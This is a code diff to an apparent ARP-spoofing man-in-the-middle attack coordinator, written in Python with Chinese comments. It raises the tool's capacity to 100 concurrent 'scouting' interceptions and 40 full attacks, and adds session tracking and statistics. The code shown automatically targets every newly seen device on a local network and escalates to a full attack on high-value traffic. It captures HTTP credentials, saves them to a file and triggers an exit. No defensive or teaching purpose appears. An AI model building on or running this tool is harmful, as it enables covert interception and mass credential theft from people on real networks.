@@ -32,10 +32,17 @@ class AttackCoordinator:
         self.logger = logging.getLogger(__name__)
         self.command_sender = None
         
-        # ★【关键修复】★ 并发攻击任务限制
-        self.max_concurrent_attacks = getattr(config, 'max_concurrent_attacks', 20)  # 最大并发攻击数
+        # ★【关键修复】★ Scout和Attack分离的并发限制
+        self.max_scout_attacks = getattr(config, 'max_scout_attacks', 100)      # Scout侦察最大并发数
+        self.max_active_attacks = getattr(config, 'max_active_attacks', 40)     # Attack攻击最大并发数
+        # 保持向后兼容
+        self.max_concurrent_attacks = getattr(config, 'max_concurrent_attacks', 40)
+        
+        # ★【分离管理】★ 独立跟踪Scout和Attack会话
+        self.active_scouts_lock = threading.Lock()
         self.active_attacks_lock = threading.Lock()
-        self.active_attacks: Set[str] = set()  # 当前活跃的攻击目标
+        self.active_scouts: Set[str] = set()        # 当前活跃的Scout侦察目标
+        self.active_attacks: Set[str] = set()       # 当前活跃的Attack攻击目标
         
         # ★【强化去重】★ 全局凭据处理去重锁和缓存
         self._global_credentials_lock = threading.RLock()  # 可重入锁
@@ -54,12 +61,15 @@ class AttackCoordinator:
         # 统计信息
         self.stats = {
             'decisions_made': 0,
-            'attacks_authorized': 0,
-            'attacks_blocked': 0,
+            'scouts_authorized': 0,           # ★【新增】★ Scout授权统计
+            'attacks_authorized': 0,          # Attack授权统计
+            'scouts_blocked': 0,              # ★【新增】★ Scout阻止统计
+            'attacks_blocked': 0,             # Attack阻止统计
+            'scout_to_attack_upgrades': 0,    # ★【新增】★ Scout升级为Attack统计
             'restores_initiated': 0,
-            'credentials_deduplicated': 0,  # ★【新增】★ 去重统计
-            'arp_restore_deduplicated': 0,   # ★【新增】★ ARP恢复去重统计
-            'decisions_deduplicated': 0     # ★【新增】★ 决策去重统计
+            'credentials_deduplicated': 0,    # 去重统计
+            'arp_restore_deduplicated': 0,    # ARP恢复去重统计
+            'decisions_deduplicated': 0       # 决策去重统计
         }
         self.stats_lock = threading.Lock()
         
@@ -78,9 +88,12 @@ class AttackCoordinator:
         def cleanup_worker():
             while True:
                 try:
-                    time.sleep(60)  # 每分钟清理一次
+                    time.sleep(30)  # ★【优化】★ 改为每30秒清理一次，更及时
                     
                     current_time = time.time()
+                    
+                    # ★【新增】★ 清理过期的Scout和Attack会话
+                    self.cleanup_expired_sessions()
                     
                     # 清理决策处理集合
                     with self._decision_lock:
@@ -102,12 +115,18 @@ class AttackCoordinator:
                             self._restoring_targets.clear()
                             self.logger.info("🧹 Cleared ARP restore tracking cache")
                     
+                    # ★【新增】★ 每5分钟输出会话统计
+                    if not hasattr(self, '_last_stats_log') or current_time - self._last_stats_log > 300:
+                        stats = self.get_session_stats()
+                        self.logger.info(f"📊 Session Stats: Scout {stats['active_scouts']}/{stats['max_scout_attacks']} ({stats['scout_utilization']:.1f}%), Attack {stats['active_attacks']}/{stats['max_active_attacks']} ({stats['attack_utilization']:.1f}%)")
+                        self._last_stats_log = current_time
+                    
                 except Exception as e:
                     self.logger.error(f"Cleanup thread error: {e}")
         
         cleanup_thread = threading.Thread(target=cleanup_worker, daemon=True, name="CoordinatorCleanup")
         cleanup_thread.start()
-        self.logger.info("🧹 Started coordinator cleanup thread")
+        self.logger.info("🧹 Started coordinator cleanup thread with session management")
         
         return True
         
@@ -151,27 +170,43 @@ class AttackCoordinator:
                 self._processing_decisions.discard(decision_key)
     
     def _handle_arp_analysis(self, analysis) -> Optional[AttackDecision]:
-        """处理ARP分析结果 - 发起侦察窗口"""
+        """处理ARP分析结果 - 发起侦察窗口 (Scout模式)"""
         if not analysis.gateway_query:
             return None
             
         target_ip = analysis.source_ip
         
+        # ★【分离管理1】★ 检查Scout并发限制
+        with self.active_scouts_lock:
+            if len(self.active_scouts) >= self.max_scout_attacks:
+                with self.stats_lock:
+                    self.stats['scouts_blocked'] += 1
+                self.logger.debug(f"Scout blocked for {target_ip} (max scout limit {self.max_scout_attacks} reached)")
+                return AttackDecision(
+                    action='ignore',
+                    target_ip=target_ip,
+                    reason='scout_limit_reached'
+                )
+        
         # 检查是否应该攻击此目标
         if not self.state_cache.should_attack_target(target_ip):
             with self.stats_lock:
-                self.stats['attacks_blocked'] += 1
+                self.stats['scouts_blocked'] += 1
                 
-            self.logger.debug(f"Attack blocked for {target_ip} (cache hit or active attack)")
+            self.logger.debug(f"Scout blocked for {target_ip} (cache hit or active session)")
             return AttackDecision(
                 action='ignore',
                 target_ip=target_ip,
                 reason='blocked_by_cache'
             )
         
+        # ★【分离管理2】★ 注册Scout会话
+        with self.active_scouts_lock:
+            self.active_scouts.add(target_ip)
+        
         # ★【核心修改】★ 启动侦察窗口，而非全面攻击
         with self.stats_lock:
-            self.stats['attacks_authorized'] += 1
+            self.stats['scouts_authorized'] += 1
             
         # 获取目标MAC (从缓存或分析结果)
         target_mac = analysis.metadata.get('src_mac', '')
@@ -196,8 +231,8 @@ class AttackCoordinator:
             decision.duration, 
             decision.attack_type
         )
-        #🕵️可以换成这个表情如果喜欢的话
-        self.logger.info(f"🔍 New device {target_ip} detected. Initiating {decision.duration}s 'scouting' MiTM.")
+        
+        self.logger.info(f"🔍 New device {target_ip} detected. Initiating {decision.duration}s 'scouting' MiTM (Scout {len(self.active_scouts)}/{self.max_scout_attacks}).")
         return decision
     
     def _handle_http_analysis(self, analysis) -> Optional[AttackDecision]:
@@ -215,8 +250,34 @@ class AttackCoordinator:
         current_attack_info = self.state_cache.get_attack_info(target_ip)
         
         # ★【核心逻辑3】★ 如果处于侦察模式，且触发高价值事件，则升级攻击
-        if is_high_value_event and current_attack_info and current_attack_info['attack_type'] == 'scouting':
-            self.logger.info(f"🎯 High-value event from {target_ip} (port {dst_port})! Upgrading to full attack for {self.config.attack.strategy.full_attack_duration}s.")
+        if (is_high_value_event and 
+            current_attack_info and 
+            current_attack_info['attack_type'] == 'scouting' and 
+            self.config.attack.strategy.auto_upgrade_on_high_value):
+            
+            # ★【分离管理3】★ 检查Attack并发限制
+            with self.active_attacks_lock:
+                if len(self.active_attacks) >= self.max_active_attacks:
+                    with self.stats_lock:
+                        self.stats['attacks_blocked'] += 1
+                    self.logger.warning(f"Cannot upgrade {target_ip} to Attack: max attack limit {self.max_active_attacks} reached")
+                    return AttackDecision(
+                        action='ignore',
+                        target_ip=target_ip,
+                        reason='attack_limit_reached'
+                    )
+                
+                # 注册Attack会话
+                self.active_attacks.add(target_ip)
+            
+            # ★【分离管理4】★ 从Scout列表移除，避免重复计数
+            with self.active_scouts_lock:
+                self.active_scouts.discard(target_ip)
+            
+            with self.stats_lock:
+                self.stats['scout_to_attack_upgrades'] += 1
+            
+            self.logger.info(f"🎯 High-value event from {target_ip} (port {dst_port})! Upgrading to full attack for {self.config.attack.strategy.full_attack_duration}s (Attack {len(self.active_attacks)}/{self.max_active_attacks}).")
             
             # 升级攻击会话
             self.state_cache.upgrade_attack_session(
@@ -243,6 +304,9 @@ class AttackCoordinator:
             
             # 保存凭据到文件
             self._save_credentials(target_ip, analysis.http_credentials, analysis.metadata)
+            
+            # ★【分离管理5】★ 清理会话跟踪
+            self._cleanup_session_tracking(target_ip)
             
             # 标记攻击成功
             self.state_cache.end_attack_session(target_ip, success=True)
@@ -279,6 +343,62 @@ class AttackCoordinator:
         # 这里可以根据实际需求扩展
             
         return False
+    
+    def _cleanup_session_tracking(self, target_ip: str):
+        """清理会话跟踪信息"""
+        # 从Scout列表移除
+        with self.active_scouts_lock:
+            self.active_scouts.discard(target_ip)
+        
+        # 从Attack列表移除
+        with self.active_attacks_lock:
+            self.active_attacks.discard(target_ip)
+    
+    def cleanup_expired_sessions(self):
+        """定期清理过期会话 - 新增方法"""
+        current_time = time.time()
+        expired_scouts = []
+        expired_attacks = []
+        
+        # 检查Scout会话
+        with self.active_scouts_lock:
+            for target_ip in list(self.active_scouts):
+                attack_info = self.state_cache.get_attack_info(target_ip)
+                if not attack_info or attack_info.get('expired', False):
+                    expired_scouts.append(target_ip)
+        
+        # 检查Attack会话
+        with self.active_attacks_lock:
+            for target_ip in list(self.active_attacks):
+                attack_info = self.state_cache.get_attack_info(target_ip)
+                if not attack_info or attack_info.get('expired', False):
+                    expired_attacks.append(target_ip)
+        
+        # 清理过期的Scout会话
+        if expired_scouts:
+            with self.active_scouts_lock:
+                for target_ip in expired_scouts:
+                    self.active_scouts.discard(target_ip)
+            self.logger.info(f"🧹 Cleaned {len(expired_scouts)} expired Scout sessions")
+        
+        # 清理过期的Attack会话
+        if expired_attacks:
+            with self.active_attacks_lock:
+                for target_ip in expired_attacks:
+                    self.active_attacks.discard(target_ip)
+            self.logger.info(f"🧹 Cleaned {len(expired_attacks)} expired Attack sessions")
+    
+    def get_session_stats(self) -> Dict[str, int]:
+        """获取会话统计信息"""
+        with self.active_scouts_lock, self.active_attacks_lock:
+            return {
+                'active_scouts': len(self.active_scouts),
+                'active_attacks': len(self.active_attacks),
+                'max_scout_attacks': self.max_scout_attacks,
+                'max_active_attacks': self.max_active_attacks,
+                'scout_utilization': len(self.active_scouts) / self.max_scout_attacks * 100,
+                'attack_utilization': len(self.active_attacks) / self.max_active_attacks * 100
+            }
     
     def _save_credentials(self, source_ip: str, credentials: Dict[str, str], metadata: Dict):
         """保存捕获的凭据并触发立即撤离 - 强化去重版本"""
